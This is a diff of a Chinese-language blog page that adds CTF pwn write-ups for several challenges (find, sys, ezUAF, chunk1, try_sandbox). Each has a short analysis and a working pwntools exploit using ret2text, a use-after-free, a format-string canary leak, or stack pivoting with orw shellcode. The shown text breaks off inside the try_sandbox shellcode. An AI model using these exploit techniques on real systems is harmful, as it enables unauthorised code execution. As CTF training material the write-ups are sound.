@@ -267,8 +267,42 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#题目分析">题目分析：</a></li>
-    <li><a href="#exp">Exp：</a></li>
+    <li><a href="#find">find</a>
+      <ol>
+        <li><a href="#题目分析">题目分析：</a></li>
+        <li><a href="#exp">exp：</a></li>
+      </ol>
+    </li>
+    <li><a href="#sys">sys</a>
+      <ol>
+        <li><a href="#题目分析-1">题目分析：</a></li>
+        <li><a href="#exp-1">exp：</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezuaf">ezUAF</a>
+      <ol>
+        <li><a href="#题目分析-2">题目分析：</a></li>
+        <li><a href="#exp-2">exp：</a></li>
+      </ol>
+    </li>
+    <li><a href="#chunk1">chunk1</a>
+      <ol>
+        <li><a href="#题目分析-3">题目分析：</a></li>
+        <li><a href="#exp-3">exp：</a></li>
+      </ol>
+    </li>
+    <li><a href="#try_sandbox">try_sandbox</a>
+      <ol>
+        <li><a href="#题目分析-4">题目分析：</a></li>
+        <li><a href="#exp-4">exp：</a></li>
+      </ol>
+    </li>
+    <li><a href="#unk">unk</a>
+      <ol>
+        <li><a href="#题目分析-5">题目分析：</a></li>
+        <li><a href="#exp-5">exp：</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -342,9 +376,355 @@
     <section class="article-content">
     
     
-    <h1 id="chunk1">chunk1
-</h1><h2 id="题目分析">题目分析：
-</h2><p>从vuln函数可看出，存在两次格式化字符串漏洞，并且两次读取都存在溢出。
+    <h2 id="find">find
+</h2><h3 id="题目分析">题目分析：
+</h3><p>start函数存在栈溢出</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921154603370.png"
+	width="648"
+	height="488"
+	srcset="/hugo-dev/p/test-chinese/image-20240921154603370_hu8752150188245119194.png 480w, /hugo-dev/p/test-chinese/image-20240921154603370_hu8945563928153112717.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921154603370"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<p>题目给出了后门函数，该函数的str全局变量的内容为/bin/sh</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921154641028.png"
+	width="318"
+	height="111"
+	srcset="/hugo-dev/p/test-chinese/image-20240921154641028_hu9146980696710462739.png 480w, /hugo-dev/p/test-chinese/image-20240921154641028_hu13977621785700653262.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921154641028"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="687px"
+	
+></p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921154649531.png"
+	width="567"
+	height="51"
+	srcset="/hugo-dev/p/test-chinese/image-20240921154649531_hu3698663744195850751.png 480w, /hugo-dev/p/test-chinese/image-20240921154649531_hu11622733234231331549.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921154649531"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1111"
+		data-flex-basis="2668px"
+	
+></p>
+<p>直接采用ret2text即可</p>
+<h3 id="exp">exp：
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(filename)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.46.59.242&#34;</span><span class="p">,</span><span class="mi">2148</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io,&#34;b *$rebase(0xc99)&#34;)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x080485F1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#debug()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please enter what you need:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">4</span><span class="p">),</span><span class="n">backdoor</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Give You Ret2libc</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sys">sys
+</h2><h3 id="题目分析-1">题目分析：
+</h3><p>打开ida，发现存在很多函数，初步判断是静态链接的题目，其中start函数存在栈溢出</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921161844582.png"
+	width="534"
+	height="157"
+	srcset="/hugo-dev/p/test-chinese/image-20240921161844582_hu953367476791320157.png 480w, /hugo-dev/p/test-chinese/image-20240921161844582_hu361241518823283624.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921161844582"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="340"
+		data-flex-basis="816px"
+	
+></p>
+<p>同时题目给出后门函数</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921161859524.png"
+	width="366"
+	height="123"
+	srcset="/hugo-dev/p/test-chinese/image-20240921161859524_hu8403214232114294685.png 480w, /hugo-dev/p/test-chinese/image-20240921161859524_hu2396651333707736510.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921161859524"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
+></p>
+<p>正常打ret2text即可</p>
+<h3 id="exp-1">exp：
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(filename)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.46.59.242&#34;</span><span class="p">,</span><span class="mi">2111</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io,&#34;b *$rebase(0xc99)&#34;)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x080488D2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#debug()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="o">+</span><span class="mi">4</span><span class="p">),</span><span class="n">backdoor</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ezuaf">ezUAF
+</h2><h3 id="题目分析-2">题目分析：
+</h3><p>ida打开题目，可以发现是堆题。漏洞点在del_note</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921194328669.png"
+	width="656"
+	height="538"
+	srcset="/hugo-dev/p/test-chinese/image-20240921194328669_hu9357165017528953448.png 480w, /hugo-dev/p/test-chinese/image-20240921194328669_hu14572189646877174183.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921194328669"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+></p>
+<p>通过观察add_note函数，新增的A堆块会通过另一个B堆块存储A堆块地址。其中B[0]存储print_note_content函数地址，b[1]存储A堆块地址。</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921194704409.png"
+	width="918"
+	height="987"
+	srcset="/hugo-dev/p/test-chinese/image-20240921194704409_hu6526710716607312160.png 480w, /hugo-dev/p/test-chinese/image-20240921194704409_hu1570707622540626758.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921194704409"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="93"
+		data-flex-basis="223px"
+	
+></p>
+<p>通过阅读print_note函数发现，输出堆块内容的方式是通过调用B[0]存储的函数地址，输出B[1]地址指向的内容</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921194852408.png"
+	width="1032"
+	height="453"
+	srcset="/hugo-dev/p/test-chinese/image-20240921194852408_hu5842626402571614962.png 480w, /hugo-dev/p/test-chinese/image-20240921194852408_hu3862056189481740448.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921194852408"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<p>同时本题提供了后门函数的利用</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921195013695.png"
+	width="380"
+	height="114"
+	srcset="/hugo-dev/p/test-chinese/image-20240921195013695_hu770155254301016786.png 480w, /hugo-dev/p/test-chinese/image-20240921195013695_hu13740677589789917449.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921195013695"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="333"
+		data-flex-basis="800px"
+	
+></p>
+<p>因此本题可以利用堆风水布局，申请B堆块空间，将B[0]更改为后门函数地址，同时利用UAF漏洞，调用后门函数。</p>
+<h3 id="exp-2">exp：
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#34;120.46.59.242&#34;,2081)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io,&#34;b *$rebase(0xc99)&#34;)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Note size :&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Content&#34;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index :&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index :&#34;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x08048945</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#debug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s2">&#34;aa&#34;</span><span class="p">)</span><span class="c1">#0</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s2">&#34;bb&#34;</span><span class="p">)</span><span class="c1">#1</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0xb</span><span class="p">,</span><span class="s2">&#34;cc&#34;</span><span class="p">)</span><span class="c1">#2</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0xb</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span><span class="c1">#3</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="chunk1">chunk1
+</h2><h3 id="题目分析-3">题目分析：
+</h3><p>从vuln函数可看出，存在两次格式化字符串漏洞，并且两次读取都存在溢出。
 <img src="/hugo-dev/p/test-chinese/image-20240921130859570.png"
 	width="554"
 	height="356"
@@ -375,8 +755,8 @@
 	
 ></p>
 <p>同时本题的canary保护开启、PIE保护关闭，因此可以利用第一次格式化字符串，泄露canary值，第二次直接通过溢出覆盖vuln函数返回地址为后门函数地址即可。</p>
-<h2 id="exp">Exp：
-</h2><div class="highlight"><div class="chroma">
+<h3 id="exp-3">exp：
+</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -442,6 +822,320 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="try_sandbox">try_sandbox
+</h2><h3 id="题目分析-4">题目分析：
+</h3><p>一道沙箱题，禁用了execve。</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921202834542.png"
+	width="629"
+	height="288"
+	srcset="/hugo-dev/p/test-chinese/image-20240921202834542_hu3685151339504213326.png 480w, /hugo-dev/p/test-chinese/image-20240921202834542_hu8844540137442075793.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921202834542"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<p>题目使用mmap开辟了一段rwx权限的空间(0x166000)</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921202513966.png"
+	width="751"
+	height="217"
+	srcset="/hugo-dev/p/test-chinese/image-20240921202513966_hu16180699883234526205.png 480w, /hugo-dev/p/test-chinese/image-20240921202513966_hu10417722284987072647.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921202513966"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="346"
+		data-flex-basis="830px"
+	
+></p>
+<p>查看sub_40129e伪代码，存在栈溢出</p>
+<p><img src="/hugo-dev/p/test-chinese/image-20240921202543082.png"
+	width="663"
+	height="244"
+	srcset="/hugo-dev/p/test-chinese/image-20240921202543082_hu10666289328460077836.png 480w, /hugo-dev/p/test-chinese/image-20240921202543082_hu900589352405848175.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240921202543082"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="652px"
+	
+></p>
+<p>因此利用思路是利用一次栈迁移，重复调用read(0,buf,0x80)，将shellcode(orw)写入0x166000的地方，然后通过ret2text执行shellcode。</p>
+<h3 id="exp-4">exp：
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(filename)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.46.59.242&#34;</span><span class="p">,</span><span class="mi">2142</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#gdb.attach(io,&#34;b *$rebase(0xc99)&#34;)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rwx_addr</span> <span class="o">=</span> <span class="mh">0x166000</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x4012cc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#debug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="p">),</span><span class="n">rwx_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span><span class="n">read_addr</span><span class="p">,</span><span class="n">rwx_addr</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;我都我都不让你执行了</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">//调用open()
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov r15, 0x67616c66
+</span></span></span><span class="line"><span class="cl"><span class="s1">push r15
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">xor rsi,rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 2
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
